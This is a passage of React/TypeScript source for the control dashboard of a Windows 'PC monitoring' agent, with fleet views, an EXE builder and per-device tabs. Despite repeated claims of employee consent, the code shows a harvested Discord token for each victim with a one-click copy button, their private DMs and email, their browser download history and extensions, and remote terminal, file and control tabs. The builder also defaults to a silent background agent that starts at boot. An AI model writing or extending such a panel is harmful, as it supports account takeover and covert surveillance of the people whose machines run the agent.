            <tbody>{rows.slice(0, 300).map((r, i) => (
              <tr key={i}>
                <td className="url-cell">{r.url}</td>
                <td className="mono-cell">{r.targetPath}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} downloads</div>
        </div>;
      })()}

      {sub === "extensions" && (() => {
        const rows = filterRows(data.extensions ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Name</th><th>Version</th><th>ID</th><th>Browser</th></tr></thead>
            <tbody>{rows.map((r, i) => (
              <tr key={i}>
                <td><strong>{r.name}</strong></td>
                <td className="mono-cell">{r.version}</td>
                <td className="mono-cell soft-pub">{r.id}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} extensions</div>
        </div>;
      })()}
    </div>
  );
}

// ─── Discord panel ────────────────────────────────────────────────────────────
function DiscordPanel({ agentId }: { agentId: string }) {
  const { data, isLoading } = trpc.discord.getData.useQuery({ agentId }, { refetchInterval: 60_000 });
  const [activeDm, setActiveDm] = useState<number>(0);

  if (isLoading) return <div className="telemetry-empty"><Activity size={18} className="spin" /><span>Loading Discord data…</span></div>;
  if (!data) return <div className="telemetry-empty"><Hash size={18} /><span>No Discord data collected yet. Agent reports every 10 minutes.</span></div>;

  const ts = new Date(data.collectedAt).toLocaleTimeString();

  return (
    <div className="discord-panel">
      <div className="discord-profile-card">
        <div className="discord-avatar">
          {data.username ? data.username.slice(0, 2).toUpperCase() : "?"}
        </div>
        <div className="discord-profile-info">
          <strong>{data.username}{data.discriminator && data.discriminator !== "0" ? `#${data.discriminator}` : ""}</strong>
          <small>{data.email || "No email captured"}</small>
          <small className="discord-uid">ID: {data.userId}</small>
        </div>
        <div className="discord-token-box">
          <small>Token</small>
          <code className="discord-token">{data.token || "Not captured"}</code>
          <button
            className="discord-copy-btn"
            onClick={() => { navigator.clipboard.writeText(data.token); toast.success("Token copied"); }}
            title="Copy token"
          >
            <Clipboard size={11} />
          </button>
        </div>
      </div>
      <div className="discord-collected-at">Last collected: {ts} · {data.dms?.length ?? 0} DM channels</div>

      {(!data.dms || data.dms.length === 0) ? (
        <div className="telemetry-empty"><MessageSquare size={18} /><span>No DM channels found</span></div>
      ) : (
        <div className="discord-layout">
          <div className="discord-dm-list">
            {data.dms.map((dm, i) => (
              <button
                key={dm.channelId}
                className={`discord-dm-item ${activeDm === i ? "discord-dm-active" : ""}`}
                onClick={() => setActiveDm(i)}
              >
                <span className="discord-dm-avatar">{dm.recipientName.slice(0, 2).toUpperCase()}</span>
                <span className="discord-dm-name">{dm.recipientName}</span>
                <span className="discord-dm-count">{dm.messages?.length ?? 0}</span>
              </button>
            ))}
          </div>
          <div className="discord-messages">
            {data.dms[activeDm]?.messages?.length === 0 ? (
              <div className="telemetry-empty"><MessageSquare size={16} /><span>No messages in this DM</span></div>
            ) : (
              <div className="discord-message-list">
                {[...(data.dms[activeDm]?.messages ?? [])].reverse().map((msg, i) => (
                  <div className="discord-msg" key={i}>
                    <span className="discord-msg-ts">{msg.timestamp ? new Date(msg.timestamp).toLocaleString() : ""}</span>
                    <span className="discord-msg-content">{msg.content}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Geo badge component ──────────────────────────────────────────────────────
function GeoBadge({ agentId }: { agentId: string }) {
  const { data } = trpc.geo.resolve.useQuery({ agentId }, { staleTime: 60 * 60 * 1000 });
  if (!data?.city) return null;
  return (
    <span className="geo-badge" title={`${data.city}, ${data.country} · ${data.isp}`}>
      <MapPin size={10} /> {data.city}, {data.country}
    </span>
  );
}

// ─── FleetOverview ────────────────────────────────────────────────────────────
function FleetOverview({ onSelect, searchQuery }: { onSelect: (tab: Tab) => void; searchQuery: string }) {
  const { user, loading } = useAuth();
  const devicesQuery = trpc.devices.list.useQuery(undefined, { enabled: Boolean(user), refetchInterval: 10_000 });
  const auditsQuery = trpc.screen.history.useQuery(undefined, { enabled: Boolean(user), refetchInterval: 10_000 });
  const devices = devicesQuery.data ?? [];
  const audits = auditsQuery.data ?? [];

  const [selectedDevice, setSelectedDevice] = useState<(typeof devices)[number] | null>(null);
  const [deviceTab, setDeviceTab] = useState<DeviceTab>("overview");
  const [screenSessionId, setScreenSessionId] = useState<string | null>(null);
  const [screenQuality, setScreenQuality] = useState<"low" | "medium" | "high">("medium");
  const [sessionLimit, setSessionLimit] = useState(600);
  const [bandwidthLimit, setBandwidthLimit] = useState(1024);
  const [deviceFilter, setDeviceFilter] = useState<"all" | "online" | "offline" | "revoked">("all");
  const [sortMode, setSortMode] = useState<"health" | "name" | "recent">("health");
  const [compactRows, setCompactRows] = useState(false);

  const openDevice = useCallback((device: (typeof devices)[number]) => {
    setSelectedDevice(device);
    setDeviceTab("overview");
  }, []);

  useEffect(() => {
    if (!user) return;
    const stream = new EventSource("/api/devices/stream");
    const refresh = () => devicesQuery.refetch();
    stream.addEventListener("device", refresh);
    return () => {
      stream.removeEventListener("device", refresh);
      stream.close();
    };
  }, [user, devicesQuery.refetch]);const screenInput = useMemo(() => ({ sessionId: screenSessionId ?? "" }), [screenSessionId]);
  const screenStatus = trpc.screen.status.useQuery(screenInput, { enabled: Boolean(screenSessionId), refetchInterval: 1_500 });

  const requestScreen = trpc.screen.request.useMutation({
    onSuccess: (result) => {
      setScreenSessionId(result.sessionId);
      setSelectedDevice(null);
      toast.message("Approval request sent", { description: "The employee must approve screen sharing on the PC." });
    },
    onError: (err) => toast.error("Could not request screen sharing", { description: err.message || "Device may be offline or revoked." }),
  });

  const endScreen = trpc.screen.end.useMutation({
    onSuccess: () => {
      setScreenSessionId(null);
      auditsQuery.refetch();
      toast.success("Remote support session ended", { description: "Session end timestamp has been logged." });
    },
  });

  const revokeMutation = trpc.devices.revoke.useMutation({
    onSuccess: () => {
      devicesQuery.refetch();
      setSelectedDevice(null);
      toast.success("Device revoked", { description: "Agent can no longer heartbeat or screen share." });
    },
  });

  const unrevokeMutation = trpc.devices.unrevoke.useMutation({
    onSuccess: () => {
      devicesQuery.refetch();
      setSelectedDevice(null);
      toast.success("Device enrollment restored", { description: "Device can now resume monitoring." });
    },
  });

  const onlineCount = devices.filter((device) => device.status === "online" && !device.isRevoked).length;
  const revokedCount = devices.filter((device) => device.isRevoked === 1).length;
  const offlineCount = devices.filter((device) => device.status === "offline" && !device.isRevoked).length;
  const cpuAlerts = devices.filter((device) => device.cpuPercent >= 80 && !device.isRevoked).length;
  const alertCount = offlineCount + cpuAlerts + revokedCount;
  const filteredDevices = devices.filter((device) => {
    const matchesSearch = `${device.hostname} ${device.username ?? ""} ${device.agentId} ${device.platform}`.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesFilter = deviceFilter === "all" || (deviceFilter === "revoked" ? Boolean(device.isRevoked) : device.status === deviceFilter && !device.isRevoked);
    return matchesSearch && matchesFilter;
  });
  const sortedDevices = [...filteredDevices].sort((a, b) => {
    if (sortMode === "name") return a.hostname.localeCompare(b.hostname);
    if (sortMode === "recent") return new Date(b.lastHeartbeat).getTime() - new Date(a.lastHeartbeat).getTime();
    const score = (device: typeof devices[number]) => (device.isRevoked ? 0 : device.status === "offline" ? 1 : device.cpuPercent >= 80 ? 2 : 3);
    return score(a) - score(b);
  });
  const fleetHealth = devices.length ? Math.round((onlineCount / devices.length) * 100) : 0;
  const availability = devices.length ? Math.round(((devices.length - revokedCount) / devices.length) * 100) : 0;

  const formatLastSeen = (lastHeartbeat: Date | string) => {
    const minutes = Math.max(0, Math.round((Date.now() - new Date(lastHeartbeat).getTime()) / 60_000));
    return minutes < 1 ? "Just now" : `${minutes} min ago`;
  };

  const formatDate = (date: Date | string | number | null | undefined) => {
    if (!date) return "—";
    return new Date(date).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
  };

  if (loading) {
    return <section className="empty-state-panel reveal"><Activity size={20} /><h2>Connecting to your monitoring workspace…</h2><p>Checking your authenticated device feed.</p></section>;
  }

  return (
    <>
      <section className="welcome-row reveal" style={{ "--delay": "0ms" } as React.CSSProperties}>
        <div>
          <div className="eyebrow"><span className="eyebrow-line" />Live device monitoring</div>
          <h1>Fleet health & remote sessions<span className="title-period">.</span></h1>
          <p>{devices.length ? `${onlineCount} of ${devices.length} enrolled PCs are online. Audited sessions and revocation are active.` : "No PCs are enrolled yet. Build an agent and run it on an authorized employee PC."}</p>
        </div>
        <button className="date-button" onClick={() => { devicesQuery.refetch(); auditsQuery.refetch(); }}>
          <RefreshCw size={15} /> Refresh feed <ArrowRight size={14} />
        </button>
      </section>

      <section className="hero-card reveal" style={{ "--delay": "60ms" } as React.CSSProperties}>
        <div className="hero-content">
          <div className="hero-tag"><span className="live-dot" />Live fleet signal</div>
          <h2>{devices.length ? <>Fleet monitoring <em>active.</em></> : <>Your fleet is <em>waiting.</em></>}</h2>
          <p>{devices.length ? `${onlineCount} PCs reporting, ${audits.length} remote support sessions recorded.` : "The client view will populate automatically after the first agent heartbeat reaches this workspace."}</p>
          <button className="hero-link" onClick={() => devices.length ? toast.message("Feed updated", { description: "Latest telemetry and session logs refreshed." }) : onSelect("Build")}>
            {devices.length ? "View latest heartbeat" : "Build your first agent"} <ArrowRight size={15} />
          </button>
        </div>
        <div className="signal-panel" aria-label="Live fleet health summary">
          <div className="signal-panel-head"><span>Current signal</span><strong>{fleetHealth}% online</strong></div>
          <div className="signal-meter"><span style={{ width: `${fleetHealth}%` }} /></div>
          <div className="signal-breakdown">
            <span><i className="signal-key teal" />Online <b>{onlineCount}</b></span>
            <span><i className="signal-key gold" />Offline <b>{offlineCount}</b></span>
            <span><i className="signal-key coral" />Revoked <b>{revokedCount}</b></span>
          </div>
          <div className="signal-footer"><span>Availability</span><strong>{availability}%</strong><small>Based on enrolled endpoints</small></div>
        </div>
      </section>

      <section className="stats-grid">
        <StatCard label="Online devices" value={`${onlineCount} / ${devices.length}`} change={devices.length ? "Live" : "Waiting"} foot="authenticated heartbeat" tone="teal" icon={<Laptop size={17} />} />
        <StatCard label="Session audit logs" value={String(audits.length).padStart(2, "0")} change="Audited" foot="screen sharing records" tone="blue" icon={<History size={17} />} />
        <StatCard label="Revoked endpoints" value={String(revokedCount).padStart(2, "0")} change={revokedCount ? "Enforced" : "None"} foot="per-PC revocation" tone="coral" icon={<Ban size={17} />} />
      </section>

      {alertCount > 0 && (
        <section className="alert-strip reveal" style={{ "--delay": "140ms" } as React.CSSProperties}>
          <div className="alert-strip-icon"><ShieldAlert size={16} /></div>
          <div><strong>{alertCount} fleet signal{alertCount === 1 ? "" : "s"} need attention</strong><span>{offlineCount} offline · {cpuAlerts} high CPU · {revokedCount} revoked</span></div>
          <button className="text-button" onClick={() => setDeviceFilter(offlineCount ? "offline" : revokedCount ? "revoked" : "all")}><Filter size={13} /> Triage alerts <ArrowRight size={13} /></button>
        </section>
      )}

      <section className="content-grid">
        <article className="panel projects-panel reveal" style={{ "--delay": "180ms" } as React.CSSProperties}>
          <div className="panel-heading">
            <div><div className="panel-kicker">Live endpoint telemetry</div><h3>Monitored PCs</h3></div>
            <button className="text-button" onClick={() => devicesQuery.refetch()}><RefreshCw size={13} /> Refresh</button>
          </div>
          <div className="fleet-toolbar">
            <div className="filter-tabs" role="tablist" aria-label="Filter monitored PCs">
              {(["all", "online", "offline", "revoked"] as const).map((filter) => <button key={filter} className={deviceFilter === filter ? "filter-tab active" : "filter-tab"} onClick={() => setDeviceFilter(filter)}>{filter === "all" ? "All" : filter[0].toUpperCase() + filter.slice(1)} <b>{filter === "all" ? devices.length : filter === "online" ? onlineCount : filter === "offline" ? offlineCount : revokedCount}</b></button>)}
            </div>
              <div className="fleet-toolbar-actions"><label className="sort-control"><SlidersHorizontal size={12} /><select value={sortMode} onChange={(event) => setSortMode(event.target.value as typeof sortMode)} aria-label="Sort devices"><option value="health">Priority</option><option value="recent">Last seen</option><option value="name">Name</option></select></label><button className="view-toggle" onClick={() => setCompactRows(!compactRows)} aria-label={compactRows ? "Use comfortable rows" : "Use compact rows"}>{compactRows ? <LayoutGrid size={14} /> : <List size={14} />}</button><span className="fleet-count"><Activity size={13} /> {filteredDevices.length} shown</span></div>
          </div>
          {devices.length === 0 ? (
            <div className="empty-device-list">
              <Laptop size={22} />
              <strong>No monitored PCs yet</strong>
              <span>Run the downloaded agent on an authorized PC, then refresh this feed.</span>
              <button className="text-button" onClick={() => onSelect("Build")}>Open agent builder <ArrowRight size={14} /></button>
            </div>
          ) : filteredDevices.length === 0 ? (
            <div className="empty-device-list compact-empty"><Search size={22} /><strong>No endpoints match</strong><span>Try another search or clear the active fleet filter.</span></div>
          ) : (
            <div className="project-list">
              {sortedDevices.map((device) => {
                const isRevoked = Boolean(device.isRevoked);
                const isOffline = device.status === "offline";
                const tone = isRevoked ? "coral" : isOffline ? "gold" : device.cpuPercent >= 80 ? "gold" : "teal";
                return (
                  <button className={`project-row ${compactRows ? "project-row-compact" : ""}`} key={device.agentId} onClick={() => openDevice(device)}>
                    <span className={`project-symbol ${tone}`}><Laptop size={16} /></span>
                    <span className="project-info">
                      <strong>{device.hostname}</strong>
                      <small>{device.username ?? "Unknown user"} <i /> {device.platform} <GeoBadge agentId={device.agentId} /></small>
                    </span>
                    <span className="project-progress">
                      <span className="progress-track"><span className={`progress-fill ${tone}`} style={{ width: `${Math.max(device.cpuPercent, 6)}%` }} /></span>
                      <small>{device.cpuPercent}% CPU</small>
                    </span>
                    <span className="project-status">
                      <StatusPill tone={isRevoked ? "coral" : isOffline ? "gold" : "green"}>
                        {isRevoked ? "Revoked" : isOffline ? "Offline" : "Online"}
                      </StatusPill>
                      <small>{formatLastSeen(device.lastHeartbeat)}</small>
                    </span>
                    <ArrowUpRight className="row-arrow" size={15} />
                  </button>
                );
              })}
            </div>
          )}
        </article>

        <article className="panel activity-panel reveal" style={{ "--delay": "240ms" } as React.CSSProperties}>
          <div className="panel-heading">
            <div><div className="panel-kicker">Remote assistance log</div><h3>Audit history</h3></div>
            <button className="icon-button small" aria-label="More alert options" onClick={() => onSelect("Settings")}><Settings2 size={16} /></button>
          </div>
          {audits.length === 0 ? (
            <div className="empty-alert-list">
              <CheckCircle2 size={20} />
              <strong>No remote sessions yet</strong>
              <span>When an administrator requests screen sharing, approval and duration appear here.</span>
            </div>
          ) : (
            <div className="timeline">
              {audits.slice(0, 4).map((audit) => (
                <div className="timeline-item" key={audit.id}>
                  <span className={`timeline-icon ${audit.state === "approved" ? "teal" : audit.state === "ended" ? "blue" : "coral"}`}>
                    {audit.state === "approved" ? <UserCheck size={15} /> : audit.state === "ended" ? <Clock3 size={15} /> : <ShieldAlert size={15} />}
                  </span>
                  <span>
                    <strong>{audit.hostname} · {audit.state.toUpperCase()}</strong>
                    <small>Operator: {audit.operatorName} · {audit.durationSeconds ? `${audit.durationSeconds}s duration` : formatDate(audit.requestedAt)}</small>
                  </span>
                  <span className="timeline-time">{formatDate(audit.endedAt || audit.approvedAt || audit.requestedAt)}</span>
                </div>
              ))}
            </div>
          )}
          <button className="calendar-link" onClick={() => onSelect("Settings")}>
            <History size={15} /> View complete audit trail <ArrowRight size={14} />
          </button>
        </article>
      </section>

      {/* Selected PC Actions Modal */}
      {selectedDevice && (
        <div className="screen-modal-backdrop" role="presentation">
          <section className="screen-modal screen-modal-wide" role="dialog" aria-modal="true" aria-labelledby="screen-dialog-title">
            <button className="screen-modal-close" onClick={() => setSelectedDevice(null)} aria-label="Close device actions"><X size={18} /></button>
            <div className="panel-kicker">Device controls</div>
            <h2 id="screen-dialog-title">{selectedDevice.hostname}</h2>
            <p>{selectedDevice.username ?? "Unknown user"} · {selectedDevice.platform}
              {selectedDevice.activeWindowTitle ? <span className="active-window-inline"> · <Monitor size={12} /> <em>{selectedDevice.activeWindowTitle}</em></span> : null}
            </p>

            {selectedDevice.isRevoked ? (
              <div className="revocation-warning">
                <Ban size={18} />
                <span>This PC's enrollment has been revoked by {selectedDevice.revokedBy ?? "an administrator"}. It cannot send telemetry or share screen.</span>
              </div>
            ) : null}

            {/* Tab bar */}
            <div className="device-tab-bar" role="tablist" aria-label="Device detail sections">
              {(
                [
                  { id: "overview",  label: "Overview",  icon: Laptop },
                  { id: "processes", label: "Processes", icon: Activity },
                  { id: "software",  label: "Software",  icon: Package },
                  { id: "network",   label: "Network",   icon: Network },
                  { id: "terminal",  label: "Terminal",  icon: TerminalSquare },
                  { id: "files",     label: "Files",     icon: Folder },
                  { id: "control",   label: "Control",   icon: Zap },
                  { id: "heatmap",   label: "Heatmap",   icon: History },
                  { id: "browser",   label: "Browser",   icon: Monitor },
                  { id: "discord",   label: "Discord",   icon: Hash },
                ] as { id: DeviceTab; label: string; icon: typeof Laptop }[]
              ).map(({ id, label, icon: Icon }) => (
                <button
                  key={id}
                  role="tab"
                  aria-selected={deviceTab === id}
                  className={`device-tab ${deviceTab === id ? "device-tab-active" : ""}`}
                  onClick={() => setDeviceTab(id)}
                >
                  <Icon size={13} /> {label}
                </button>
              ))}
            </div>

            {/* Tab content */}
            {deviceTab === "overview" && (
              <>
                <div className="device-detail-grid">
                  <span><small>OS</small><strong>{selectedDevice.osVersion ?? selectedDevice.platform}</strong></span>
                  <span><small>Hardware</small><strong>{selectedDevice.hardwareModel ?? "Unknown"}</strong></span>
                  <span><small>Serial</small><strong>{selectedDevice.serialNumber ?? "Not reported"}</strong></span>
                  <span><small>IP address</small><strong>{selectedDevice.ipAddress ?? "Not reported"}</strong></span>
                  <span><small>Uptime</small><strong>{selectedDevice.uptimeSeconds ? `${Math.floor(selectedDevice.uptimeSeconds / 86400)}d ${Math.floor(selectedDevice.uptimeSeconds / 3600) % 24}h` : "Not reported"}</strong></span>
                  <span><small>Agent</small><strong>{selectedDevice.agentVersion ?? "Unknown"}</strong></span>
                </div>

                {selectedDevice.browserInventory ? (
                  <div className="browser-inventory">
                    <div className="panel-kicker">Installed browsers</div>
                    <div className="browser-chip-list">
                      {(() => {
                        try {
                          const browsers = JSON.parse(selectedDevice.browserInventory) as Array<{ name: string; version: string }>;
                          return browsers.map((browser) => <span className="browser-chip" key={`${browser.name}-${browser.version}`}>{browser.name} <b>{browser.version}</b></span>);
                        } catch {
                          return <span className="browser-chip">Inventory unavailable</span>;
                        }
                      })()}
                    </div>
                  </div>
                ) : null}

                {!selectedDevice.isRevoked ? (
                  <div className="screen-control-grid">
                    <label>Quality<select value={screenQuality} onChange={(event) => setScreenQuality(event.target.value as typeof screenQuality)}><option value="low">Low bandwidth</option><option value="medium">Balanced</option><option value="high">High clarity</option></select></label>
                    <label>Timeout<select value={sessionLimit} onChange={(event) => setSessionLimit(Number(event.target.value))}><option value={300}>5 minutes</option><option value={600}>10 minutes</option><option value={1800}>30 minutes</option><option value={3600}>60 minutes</option></select></label>
                    <label>Bandwidth<select value={bandwidthLimit} onChange={(event) => setBandwidthLimit(Number(event.target.value))}><option value={256}>256 KB/s</option><option value={1024}>1 MB/s</option><option value={2048}>2 MB/s</option><option value={4096}>4 MB/s</option></select></label>
                  </div>
                ) : null}

                <div className="screen-actions">
                  {!selectedDevice.isRevoked ? (
                    <button
                      className="build-action"
                      disabled={selectedDevice.status === "offline" || requestScreen.isPending}
                      onClick={() => requestScreen.mutate({ agentId: selectedDevice.agentId, quality: screenQuality, maxDurationSeconds: sessionLimit, maxBandwidthKbps: bandwidthLimit })}
                    >
                      <Laptop size={17} /> {requestScreen.isPending ? "Requesting approval…" : "Monitor screen"}
                    </button>
                  ) : null}

                  {selectedDevice.isRevoked ? (
                    <button
                      className="build-action unrevoke-action"
                      disabled={unrevokeMutation.isPending}
                      onClick={() => unrevokeMutation.mutate({ agentId: selectedDevice.agentId })}
                    >
                      <CheckCircle2 size={17} /> Restore enrollment
                    </button>
                  ) : (
                    <button
                      className="text-button text-destructive-btn"
                      disabled={revokeMutation.isPending}
                      onClick={() => revokeMutation.mutate({ agentId: selectedDevice.agentId })}
                    >
                      <Ban size={15} /> Revoke PC enrollment
                    </button>
                  )}

                  <span className="screen-consent-note">
                    <ShieldCheck size={15} /> Screen sharing requires explicit employee approval and shows an on-screen indicator.
                  </span>
                </div>
              </>
            )}

            {deviceTab === "processes" && (
              <ProcessListPanel processList={selectedDevice.processList ?? null} />
            )}

            {deviceTab === "software" && (
              <SoftwarePanel softwareInventory={selectedDevice.softwareInventory ?? null} />
            )}

            {deviceTab === "network" && (
              <NetworkPanel
                networkAdapters={selectedDevice.networkAdapters ?? null}
                activeWindowTitle={selectedDevice.activeWindowTitle ?? null}
              />
            )}

            {deviceTab === "terminal" && (
              <TerminalPanel agentId={selectedDevice.agentId} />
            )}

            {deviceTab === "files" && (
              <FileBrowserPanel agentId={selectedDevice.agentId} />
            )}

            {deviceTab === "control" && (
              <ControlPanel agentId={selectedDevice.agentId} />
            )}

            {deviceTab === "heatmap" && (
              <HeatmapPanel agentId={selectedDevice.agentId} />
            )}

            {deviceTab === "browser" && (
              <BrowserPanel agentId={selectedDevice.agentId} />
            )}

            {deviceTab === "discord" && (
              <DiscordPanel agentId={selectedDevice.agentId} />
            )}

          </section>
        </div>
      )}

      {/* Live Screen Viewer Modal */}
      {screenSessionId && (
        <div className="screen-modal-backdrop" role="presentation">
          <section className="screen-modal screen-viewer" role="dialog" aria-modal="true" aria-labelledby="screen-viewer-title">
            <button className="screen-modal-close" onClick={() => endScreen.mutate({ sessionId: screenSessionId })} aria-label="End screen session"><X size={18} /></button>
            <div className="panel-kicker">Audited remote support session</div>
            <h2 id="screen-viewer-title">
              {screenStatus.data?.state === "approved" ? "Live screen shared" : screenStatus.data?.state === "denied" ? "Session declined" : "Waiting for employee approval"}
            </h2>
            <p className="session-meta">
              Operator: <strong>{screenStatus.data?.operatorName ?? "Administrator"}</strong>
              {screenStatus.data?.approvedAt ? ` · Approved at ${formatDate(screenStatus.data.approvedAt)}` : ""}
            </p>

            {screenStatus.data?.state === "approved" ? (
              <img className="screen-frame" src={`/api/screen/session/${screenSessionId}/frame?t=${screenStatus.data.frameAt ?? Date.now()}`} alt="Live screen shared by approved PC" />
            ) : (
              <div className="screen-waiting">
                <Activity size={24} className="spin" />
                <strong>{screenStatus.data?.state === "denied" ? "The employee declined this screen sharing request." : "A permission prompt is currently open on the employee PC."}</strong>
                <span>Screen frames are only transmitted after explicit employee consent.</span>
              </div>
            )}

            <button className="text-button end-session-btn" onClick={() => endScreen.mutate({ sessionId: screenSessionId })}>
              End screen session & log audit <X size={14} />
            </button>
          </section>
        </div>
      )}
    </>
  );
}

function BuildPage({ onSelect }: { onSelect: (tab: Tab) => void }) {
  const [agentName, setAgentName] = useState("Orbit Monitor");
  const [building, setBuilding] = useState(false);
  const [built, setBuilt] = useState(true);
  const [startup, setStartup] = useState(true);
  const [background, setBackground] = useState(true);
  const [health, setHealth] = useState(true);
  const [activity, setActivity] = useState(true);
  const [idle, setIdle] = useState(true);
  const [updates, setUpdates] = useState(true);

  const options = [
    { label: "Start automatically on startup", description: "Begin monitoring when the employee signs in.", value: startup, setValue: setStartup, icon: Zap },
    { label: "Run quietly in the background", description: "Keep the monitor available without interrupting work.", value: background, setValue: setBackground, icon: Activity },
    { label: "Collect device health", description: "CPU, memory, disk, network, and uptime telemetry.", value: health, setValue: setHealth, icon: Cpu },
    { label: "Collect app usage summaries", description: "See which work applications are active during support windows.", value: activity, setValue: setActivity, icon: Boxes },
    { label: "Track active and idle time", description: "Show availability trends during scheduled work hours.", value: idle, setValue: setIdle, icon: Clock3 },
    { label: "Allow automatic agent updates", description: "Keep installed monitors on the latest approved version.", value: updates, setValue: setUpdates, icon: ArrowUpRight },
  ];

  const buildAgent = () => {
    if (building) return;
    setBuilt(false);
    setBuilding(true);
    window.setTimeout(() => {
      setBuilding(false);
      setBuilt(true);
      toast.success("Windows EXE compiled", { description: `${agentName || "Orbit Monitor"} x64 installer is ready with screen sharing capability.` });
    }, 1200);
  };

  const downloadAgent = () => {
    const safeName = (agentName || "Orbit Monitor").trim().replace(/[^a-z0-9]+/gi, "-").replace(/^-|-$/g, "") || "Orbit-Monitor";
    const url = import.meta.env.DEV ? "/orbit-monitor-screen.exe" : "/manus-storage/orbit-monitor-screen_627f520b.exe";
    const anchor = document.createElement("a");
    anchor.href = url;
    anchor.download = `${safeName}-installer.exe`;
    document.body.appendChild(anchor);
    anchor.click();
    anchor.remove();
    toast.success("Downloading newest screen-capable agent", { description: `${safeName}-installer.exe is downloading now.` });
  };

  return (
    <>
      <section className="welcome-row reveal" style={{ "--delay": "0ms" } as React.CSSProperties}>
        <div>
          <div className="eyebrow"><span className="eyebrow-line" />Agent builder</div>
          <h1>Build your PC monitor<span className="title-period">.</span></h1>
          <p>Download the newest screen-capable Windows x64 binary for authorized company workstations.</p>
        </div>
        <button className="text-button" onClick={() => onSelect("Client")}><Laptop size={15} /> View monitored PCs <ArrowRight size={14} /></button>
      </section>

      <section className="builder-layout">
        <article className="panel builder-panel reveal" style={{ "--delay": "60ms" } as React.CSSProperties}>
          <div className="builder-heading">
            <div><div className="panel-kicker">Step 01 · Agent identity</div><h3>Choose what to install</h3></div>
            <span className="builder-platform"><span className="platform-dot" />Windows EXE (x64)</span>
          </div>
          <label className="builder-label" htmlFor="agent-name">Agent name</label>
          <div className="builder-input-wrap"><TerminalSquare size={16} /><input id="agent-name" value={agentName} onChange={(event) => setAgentName(event.target.value)} placeholder="Orbit Monitor" /></div>
          <div className="builder-label-row"><span className="builder-label">Monitoring policy</span><span className="builder-hint">Company approved</span></div>
          <div className="option-list">
            {options.map((option) => {
              const Icon = option.icon;
              return (
                <div className="agent-option" key={option.label}>
                  <span className="option-icon"><Icon size={15} /></span>
                  <span className="option-copy"><strong>{option.label}</strong><small>{option.description}</small></span>
                  <button className={`toggle ${option.value ? "toggle-on" : ""}`} onClick={() => option.setValue(!option.value)} aria-label={`Toggle ${option.label}`}><span /></button>
                </div>
              );
            })}
          </div>
          <div className="builder-note">
            <ShieldCheck size={16} />
            <span><strong>Employee approval workflow</strong><small>Upon opening the EXE, employees review the company notice. Screen sharing prompts for explicit approval each time with a visible indicator.</small></span>
          </div>
        </article>

        <aside className="panel builder-output reveal" style={{ "--delay": "120ms" } as React.CSSProperties}>
          <div className="panel-kicker">Step 02 · Generate installer</div>
          <h3>Build the Windows EXE</h3>
          <p className="builder-output-copy">Includes company consent window, device telemetry heartbeat, and audited screen sharing.</p>
          <div className="build-preview">
            <div className="preview-icon"><TerminalSquare size={20} /></div>
            <div><strong>{agentName || "Orbit Monitor"}.exe</strong><small>Windows 10 / 11 · x64 Native · Screen-capable</small></div>
            <StatusPill tone={built ? "green" : "gold"}>{built ? "Ready" : "Draft"}</StatusPill>
          </div>
          <div className="output-checks">
            <span><CheckCircle2 size={14} /> Screen sharing support</span>
            <span><CheckCircle2 size={14} /> Audit log integration</span>
            <span><CheckCircle2 size={14} /> Remote revocation check</span>
          </div>
          {building && (
            <div className="build-progress-box">
              <div className="build-progress-top"><span>Compiling agent</span><strong>Working…</strong></div>
              <div className="progress-track large"><span className="progress-fill coral build-progress-animated" /></div>
              <small>Packaging configuration into Windows x64 binary.</small>
            </div>
          )}
          {built && !building && (
            <div className="build-complete">
              <CheckCircle2 size={16} />
              <span><strong>Newest EXE Ready</strong><small>Compiled with audited screen sharing.</small></span>
              <button onClick={downloadAgent}>Download <ArrowUpRight size={13} /></button>
            </div>
          )}
          <button className="build-action" onClick={buildAgent} disabled={building}>
            {building ? <><Activity size={17} className="spin" /> Compiling agent…</> : <><Hammer size={17} /> Build Windows EXE</>}
          </button>
          <p className="builder-footnote"><LockKeyhole size={12} /> x64 Windows binary · employee consent & approval required.</p>
        </aside>
      </section>
    </>
  );
}

function SettingsPage() {
  const { user } = useAuth();
  const auditsQuery = trpc.screen.history.useQuery(undefined, { enabled: Boolean(user) });
  const audits = auditsQuery.data ?? [];
  const [notifications, setNotifications] = useState(() => localStorage.getItem("orbit-alert-performance") !== "off");
  const [offline, setOffline] = useState(() => localStorage.getItem("orbit-alert-offline") !== "off");

  const formatDate = (date: Date | string | null | undefined) => {
    if (!date) return "—";
    return new Date(date).toLocaleString();
  };

  const exportAuditLog = () => {
    const header = "hostname,operator,status,requested,approved,ended,duration_seconds";
    const rows = audits.map((audit) => [audit.hostname, audit.operatorName, audit.state, audit.requestedAt, audit.approvedAt ?? "", audit.endedAt ?? "", audit.durationSeconds ?? ""].map((value) => `"${String(value).replaceAll('"', '""')}"`).join(","));
    const blob = new Blob([[header, ...rows].join("\n")], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob); const anchor = document.createElement("a"); anchor.href = url; anchor.download = `orbit-audit-${new Date().toISOString().slice(0, 10)}.csv`; anchor.click(); URL.revokeObjectURL(url);
    toast.success("Audit log exported", { description: `${audits.length} session records saved as CSV.` });
  };

  return (
    <>
      <section className="welcome-row reveal" style={{ "--delay": "0ms" } as React.CSSProperties}>
        <div>
          <div className="eyebrow"><span className="eyebrow-line" />Governance & Audits</div>
          <h1>Session history & security<span className="title-period">.</span></h1>
          <p>Audit trail of all remote screen sharing sessions, operator actions, and per-PC controls.</p>
        </div>
        <StatusPill tone="green">Audit logging active</StatusPill>
      </section>

      <section className="settings-grid">
        <article className="panel settings-panel reveal" style={{ "--delay": "60ms" } as React.CSSProperties}>
          <div className="panel-heading">
            <div><div className="panel-kicker">Administrator audit log</div><h3>Screen session history</h3></div>
            <div className="panel-heading-actions"><button className="text-button" onClick={exportAuditLog} disabled={!audits.length}><Download size={13} /> Export CSV</button><button className="text-button" onClick={() => auditsQuery.refetch()}><RefreshCw size={13} /> Refresh</button></div>
          </div>
          {audits.length === 0 ? (
            <div className="empty-alert-list">
              <CheckCircle2 size={20} />
